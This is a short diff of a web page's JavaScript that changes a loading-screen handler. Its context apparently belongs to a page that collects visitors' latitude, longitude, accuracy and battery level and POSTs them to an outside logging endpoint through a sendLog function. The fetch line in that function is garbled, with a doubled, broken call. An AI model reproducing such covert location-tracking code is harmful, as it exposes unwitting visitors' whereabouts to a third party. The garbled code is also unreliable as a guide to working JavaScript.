@@ -77,12 +77,11 @@
     const loading = document.getElementById("loading");
     const randomNames = ["SatriaHitam", "HantuLangit", "Pengintai08", "X-Shadow", "404User", "SilentWolf", "DewaGelap"];
 
-    window.onload = () => {
-      setTimeout(() => {
-        loading.style.display = "none";
-      }, 2000);
-    };
-
+    document.addEventListener("DOMContentLoaded", () => {
+  setTimeout(() => {
+    loading.style.display = "none";
+  }, 2000);
+});
     function sendLog(lat, lon, acc, battery) {
       fetch("fetch("https://cobraanotdeveloper.pythonanywhere.com/log", {", {
         method: "POST",
